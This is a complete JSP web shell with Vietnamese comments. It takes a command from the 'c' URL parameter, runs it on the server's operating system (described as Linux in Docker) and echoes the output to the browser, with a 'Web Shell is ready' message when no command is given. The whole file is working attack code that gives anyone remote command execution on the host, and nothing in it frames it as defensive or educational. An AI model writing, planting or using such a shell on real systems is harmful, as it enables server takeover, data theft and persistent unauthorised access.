<%@ page import="java.io.*" %>
<%
    // Lấy lệnh từ tham số 'c' trên URL
    String cmd = request.getParameter("c");
    if (cmd != null) {
        // Chạy lệnh trên hệ điều hành của server (Linux trong Docker)
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream i = p.getInputStream();
        int b;
        // In kết quả ra màn hình trình duyệt
        while ((b = i.read()) != -1) {
            out.print((char)b);
        }
    } else {
        out.print("Web Shell is ready! Use ?c=your_command");
    }
%>